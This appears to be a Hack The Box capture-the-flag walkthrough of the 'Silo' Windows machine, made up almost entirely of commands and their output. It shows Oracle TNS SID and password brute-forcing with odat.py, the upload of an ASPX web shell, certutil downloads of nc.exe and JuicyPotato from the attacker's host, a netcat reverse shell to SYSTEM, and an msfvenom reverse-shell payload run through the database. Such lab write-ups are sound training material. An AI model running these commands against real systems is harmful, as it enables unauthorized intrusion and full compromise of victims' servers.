# Silo

### Summary

* Port 1521 is running Oracle TNS Listener 11.2.0.2.
* Use odat.py to brute force SID, username and password (scott:tiger)
* Use it to upload a aspx reverse shell to C:\inetpub\wwwroot which I can access at 10.10.10.82/shell.aspx
* PrivEsc via juicy potato

### Nmap

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.82]
└─# nmap -p- --min-rate 5000 -Pn 10.10.10.82 -oN all_ports.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 02:52 EDT
Nmap scan report for 10.10.10.82
Host is up (0.18s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
8080/tcp  open  http-proxy
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.82]
└─# nmap -p 80,135,139,445,1521,5985,8080 -A --min-rate 5000 -Pn 10.10.10.82 -oN aggr.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 02:53 EDT
Nmap scan report for 10.10.10.82
Host is up (0.17s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http         Oracle XML DB Enterprise Edition httpd
|_http-title: 400 Bad Request
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=XDB
|_http-server-header: Oracle XML DB/Oracle Database
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-07T06:53:32
|_  start_date: 2023-05-07T06:51:26
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   173.52 ms 10.10.14.1
2   173.83 ms 10.10.10.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.01 seconds
```

### Port 1521 Upload Rev Shell

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.82]
└─# nmap --script "oracle-tns-version" -p 1521 -T4 -sV 10.10.10.82
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 02:57 EDT
Nmap scan report for 10.10.10.82
Host is up (0.17s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds


┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# ./odat.py all -s 10.10.10.82 -p 1521  
[+] Checking if target 10.10.10.82:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.10.10.82:1521 is well configured. Continue...

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.10.10.82:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...            ################################################# | ETA:  00:00:02 
100% 
…
┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# ./odat.py passwordguesser -s 10.10.10.82 -d XE                                           

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
The login abm has already been tested at least once. What do you want to do:                      | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                    | ETA:  00:13:46 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                    | ETA:  00:13:22 
[!] Notice: 'dip' account is locked, so skipping this username for password                       | ETA:  00:12:50 
[!] Notice: 'hr' account is locked, so skipping this username for password                        | ETA:  00:10:47 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                     | ETA:  00:08:30 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password                | ETA:  00:06:42 
[!] Notice: 'outln' account is locked, so skipping this username for password                     | ETA:  00:06:01 
[+] Valid credentials found: scott/tiger. Continue...           ###############                   | ETA:  00:03:20

┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# ./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile "C:\inetpub\wwwroot" shell.aspx shell.aspx 

[1] (10.10.10.82:1521): Put the shell.aspx local file in the C:\inetpub\wwwroot folder like shell.aspx on the 10.10.10.82 server
[+] The shell.aspx file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the shell.aspx file

Browse to http://10.10.10.82/shell.aspx

```

### PrivEsc

```bash
c:\Users\Phineas\Desktop>systeminfo
systeminfo

Host Name:                 SILO
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-00115-23036-AA976
Original Install Date:     12/31/2017, 11:01:23 PM
System Boot Time:          5/7/2023, 7:51:16 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
…

┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# python3 -m http.server 8080
10.10.10.82 - - [07/May/2023 04:27:42] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.82 - - [07/May/2023 04:27:43] "GET /nc.exe HTTP/1.1" 200 -

c:\Users\Phineas\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\TEMP>certutil -urlcache -f http://10.10.14.4:8080/nc.exe nc.exe
certutil -urlcache -f http://10.10.14.4:8080/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\TEMP>certutil -urlcache -f http://10.10.14.4:8080/juicypotato.exe juicypotato.exe
certutil -urlcache -f http://10.10.14.4:8080/juicypotato.exe juicypotato.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\TEMP>juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.10.14.4 8080" -t *
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.10.14.4 8080" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# nc -lvp 8080
listening on [any] 8080 ...
10.10.10.82: inverse host lookup failed: Unknown host
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.82] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

### OR get SYSTEM shell straight away (Odat upload rev shell and execute)

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.82]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o reverse.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# ./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile "C:\temp" reverse.exe ../reverse.exe 

[1] (10.10.10.82:1521): Put the ../reverse.exe local file in the C:\temp folder like reverse.exe on the 10.10.10.82 server
[+] The ../reverse.exe file was created on the C:\temp directory on the 10.10.10.82 server like the reverse.exe file

┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# ./odat.py externaltable -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --exec "c:\temp" reverse.exe

[1] (10.10.10.82:1521): Execute the reverse.exe command stored in the c:\temp path


┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.82/odat]
└─# nc -lvp 443              
listening on [any] 443 ...
10.10.10.82: inverse host lookup failed: Unknown host
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.82] 49194
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
whoami
nt authority\system

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>
```
